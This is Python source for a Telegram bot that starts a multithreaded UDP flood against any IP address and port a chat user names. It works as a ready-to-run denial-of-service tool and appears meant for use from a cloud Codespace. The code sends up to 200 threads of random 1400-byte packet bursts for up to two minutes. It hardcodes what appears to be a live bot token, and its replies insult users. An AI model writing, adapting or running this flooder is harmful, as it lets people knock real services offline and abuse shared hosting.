import telebot
import socket
import random
import threading
import time
import sys
import multiprocessing

BOT_TOKEN = '8472088871:AAGLydsd2T4cjJqHp8KsNT4KTXh-08VH3GM'  # @BotFather se token daal
bot = telebot.TeleBot(BOT_TOKEN)

attacking = False

def get_cpu_cores():
    try:
        return multiprocessing.cpu_count()
    except:
        return 4  # Default for 4-core Codespace

def udp_flood(target_ip, target_port, duration):
    def flood_thread():
        global attacking
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1400)  # Max payload
        while attacking and time.time() < start_time + duration:
            try:
                for _ in range(20):  # 20-packet burst
                    sock.sendto(bytes, (target_ip, target_port))  # Target port only
                time.sleep(0.0001)  # Ultra-tight delay
            except:
                pass  # Hammer on
        sock.close()

    global start_time
    start_time = time.time()
    attacking = True
    num_threads = min(get_cpu_cores() * 50, 200)  # 200 threads on 4-core
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=flood_thread)
        t.start()
        threads.append(t)
    
    time.sleep(duration)
    attacking = False
    for t in threads:
        t.join()

@bot.message_handler(commands=['start'])
def start(message):
    cores = get_cpu_cores()
    bot.reply_to(message, f"Yo, this is your 4-core 16GB UDP flood beast on Codespace. Drop /attack <ip> <port> <seconds> to smash that port. Example: /attack 127.0.0.1 80 30. Threads auto: {min(cores * 50, 200)}.")

@bot.message_handler(commands=['attack'])
def attack(message):
    try:
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "Format fuck? /attack <ip> <port> <seconds>")
            return
        target_ip = parts[1]
        target_port = int(parts[2])
        duration = min(int(parts[3]), 120)  # 2-min cap
        cores = get_cpu_cores()
        threads = min(cores * 50, 200)
        bot.reply_to(message, f"Blasting {target_ip}:{target_port} for {duration}s with {threads} threads on {cores}-core beast. Let’s destroy...")
        threading.Thread(target=udp_flood, args=(target_ip, target_port, duration), daemon=True).start()
        bot.reply_to(message, "Flood’s raging. Stops at time’s up.")
    except ValueError:
        bot.reply_to(message, "Port/time numbers only, asshole.")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(func=lambda msg: True)
def echo(message):
    bot.reply_to(message, "Only /start or /attack, dickhead.")

if __name__ == '__main__':
    print("Bot’s fucking ready in 4-core 16GB beast. Ctrl+C to kill.")
    try:
        bot.polling(none_stop=True)
    except KeyboardInterrupt:
        sys.exit(0)
